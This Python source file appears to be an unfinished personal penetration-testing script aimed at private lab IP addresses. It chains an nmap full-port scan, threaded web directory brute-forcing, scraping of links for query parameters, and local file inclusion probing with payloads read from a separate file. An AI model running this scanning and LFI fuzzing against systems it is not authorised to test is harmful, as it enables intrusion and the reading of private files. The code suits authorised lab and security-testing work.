import nmap3
import pandas as pd
from bs4 import BeautifulSoup
import requests
from sys import argv
import threading
import httpx
from concurrent.futures import ThreadPoolExecutor
from selenium import webdriver
from colorama import Fore, Style, init
import time

ip_1 = "10.10.248.85"
ip_2 = "10.10.248.86"
credentials = []
services = []
run_in_background = []
found_web_directories = []
links = []
lfi_results = []
lfi_candidates = []

class Scanner:
    def __init__(self, ip):
        self.ip = ip
        self.nmap = nmap3.NmapScanTechniques() # initiate Nmap

    def scan_all_ports(self):
        ip = self.ip
        global services
        scan_data = self.nmap.nmap_tcp_scan(ip, '-p- --min-rate=1500') # this returns a dict of the nmap results
        open_ports = [port for port in scan_data[ip]['ports'] if port['state'] == 'open'] # condition to only pass through open ports
        df = pd.json_normalize(open_ports) # formats the open ports as a table, turning the list of open port dictionaries into a DataFrame
        # iterating over the DataFrames rows to find services, and append the ip, port, and service to the global var 'services'
        for _, row in df.iterrows():
            service = row['service.name']
            port = row['portid']
            services.append({'ip': ip, 'port': port, 'service': service})
        print(df)
        print(services)

class WebFuzzing:
    """
    A class for performing web fuzzing to discover accessible directories on a target web server.
    Attributes:
        ip (str): The IP address of the target server.
        thread_count (int): The number of threads to use for concurrent requests.
    Methods:
        check_directory(url):
            Sends a HEAD request to the specified URL and prints it if the response status code indicates the directory exists or is accessible (200, 301, 403).
        httpx_fuzzing():
            Determines the base URL based on detected HTTP/HTTPS services, reads a wordlist of directory names, and concurrently checks each directory using threads.
    """
    def __init__(self, ip, thread_count):
        self.ip = ip
        self.thread_count = thread_count
        self.stop_fuzzing = False

    def check_directory(self, url):
        try:
            response = httpx.head(url, verify=False, timeout=3)
            if response.status_code in [200, 301, 403]:
                print(f"Found URL ({response.status_code}): {url}")
        except Exception:
            pass

    def httpx_fuzzing(self):
        if any(entry['port'] == '80' and entry['service'] == 'http' for entry in services):
            base_url = f"http://{self.ip}/"
        elif any(entry['port'] == '443' and entry['service'] == 'https' for entry in services):
            base_url = f"https://{self.ip}/"
        else:
            print("No HTTP/S detected")
            return

        wordlist = "/usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt"

        def wait_for_user():
            input("Press Enter at any time to proceed to the next phase...\n")
            self.stop_fuzzing = True

        threading.Thread(target=wait_for_user, daemon=True).start()
        try:
            with open(wordlist, 'r') as f:
                dirs = [line.strip() for line in f]
            with ThreadPoolExecutor(max_workers=self.thread_count) as executor: # due to ThreadPoolExecutor behviour some tasks (dir busting) will continue after breaking to the next phase
                for dirs_name in dirs:
                    if self.stop_fuzzing:
                        print("Proceeding to locating possible LFI's in found web pages")
                        break
                    url = base_url + dirs_name
                    executor.submit(self.check_directory, url)
                    time.sleep(0.01)
                if self.stop_fuzzing:
                    executor.shutdown(wait=True)
                    self.locate_lfi('/dev') # testing, need to add ability to iterate through found webpages
        except FileNotFoundError:
            print(f"wordlist '{wordlist}' not found")

    def locate_lfi(self, web_page):
        response = requests.get(f"http://{self.ip}/{web_page}")
        soup = BeautifulSoup(response.text, 'html.parser')
        links = soup.find_all("a")

        hrefs = []
        for link in links:
            href = link.get("href")
            if href not in hrefs:
                hrefs.append(str(href))
        hrefs_df = pd.DataFrame({'Links': hrefs})
        print(Fore.GREEN + f"Links scraped of web page: {web_page}" + Style.RESET_ALL)
        print(hrefs_df)
        
        print(Fore.YELLOW + "Possible LFI Vulnerbility" + Style.RESET_ALL)
        possible_lfi = set()
        for href in hrefs:
            if href and "?" in href:
                param = href.split("?")[1].split("=")[0] # extract parameter name
                base_url = href.split("=")[0]
                full_url = f"http://{self.ip}{web_page}/{base_url}"
                lfi_candidates.append({'url': full_url, 'href': href, 'Possible vulnerable parameter': param})
        lfi_df = pd.DataFrame(lfi_candidates)
        print(lfi_df)

    def test_lfi(self, payload_file):
        negative = ['Failed opening']
        seen = set()
        with open(payload_file, 'r') as f:
            for payload in f:
                payload = payload.strip()
                for candidate in lfi_candidates:
                    url = candidate['url']
                    param = candidate['Possible vulnerable parameter']
                    key = (url, param, payload)
                    if key in seen:
                        continue
                    seen.add(key)
                    response = requests.get(url, params={param: payload})
                    print(Fore.YELLOW + f"Testing For LFI vulnerability: {url}?{param}={payload}" + Style.RESET_ALL)
                    if any(neg in response.text for neg in negative):
                        continue
                    soup = BeautifulSoup(response.text, 'html.parser')
                    lfi_content = '\n'.join([tag.get_text() for tag in soup.find_all('p')])
                    if lfi_content:
                        lfi_results.append({
                            "Url": f"{url}?{param}={payload}",
                            "Content": lfi_content,
                            "Is Vulnerable": "Most Likely Vulnerable"
                        })
        lfi_results_df = pd.DataFrame(lfi_results)
        print(lfi_results_df)
            

        

        
                    

        

    

if __name__ == "__main__":
    #scanner = Scanner(ip=ip_2)
    #scanner.scan_all_ports()
    #web_actions = WebFuzzing(ip_2, 10)
    #web_actions.httpx_fuzzing()
    test_lfi = WebFuzzing(ip_2, 1)
    test_lfi.locate_lfi('/dev')
    test_lfi.test_lfi('./lfi_payload')
    

    


